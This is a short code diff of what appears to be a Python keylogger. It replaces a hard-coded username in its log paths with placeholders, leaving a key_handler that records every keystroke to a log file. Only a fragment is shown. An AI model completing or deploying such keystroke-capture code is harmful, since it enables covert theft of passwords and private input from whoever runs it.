@@ -4,9 +4,9 @@ import logging
 from shutil import copyfile
 
 username = os.getlogin()
-logging_directory = f"c:/Users/rhysa/Desktop"
+logging_directory = f"c:/Users/<YOUR USERNAME>/Desktop"
 
-logging.basicConfig(filename=f"C:/Users/rhysa/Desktop/Python/Logging/log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
+logging.basicConfig(filename=f"LOG.TXT DIRECTORY HERE", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 def key_handler(key):
     logging.info(key)
